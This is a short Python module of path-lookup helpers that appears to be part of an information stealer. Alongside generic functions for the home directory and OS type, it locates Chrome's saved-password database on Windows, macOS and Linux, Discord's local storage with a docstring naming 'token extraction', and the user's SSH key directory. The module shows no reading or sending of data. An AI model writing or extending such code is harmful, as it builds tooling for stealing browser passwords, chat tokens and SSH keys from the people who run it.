import os
import platform

def get_user_home():
    """Get user home directory cross-platform"""
    return os.path.expanduser("~")

def get_os_type():
    """Get OS type: windows, linux, darwin"""
    return platform.system().lower()

def get_appdata_path():
    """Get AppData path for current user (Windows)"""
    if os.name == 'nt':
        return os.getenv('APPDATA')
    return None

def get_chrome_password_db():
    """Get Chrome password database path"""
    if os.name == 'nt':
        return os.path.join(get_user_home(), "AppData/Local/Google/Chrome/User Data/Default/Login Data")
    elif platform.system() == "Darwin":
        return os.path.join(get_user_home(), "Library/Application Support/Google/Chrome/Default/Login Data")
    else:
        return os.path.join(get_user_home(), ".config/google-chrome/Default/Login Data")

def get_discord_storage_paths():
    """Get Discord storage paths for token extraction"""
    home = get_user_home()
    appdata = os.getenv('APPDATA')
    
    paths = [
        os.path.join(appdata or home, "discord/Local Storage/leveldb/") if os.name == 'nt' else None,
        os.path.join(home, ".config/discord/Local Storage/leveldb/"),
        os.path.join(home, "Library/Application Support/discord/Local Storage/leveldb/"),
    ]
    
    return [p for p in paths if p is not None]

def get_ssh_path():
    """Get SSH directory path"""
    return os.path.join(get_user_home(), ".ssh")
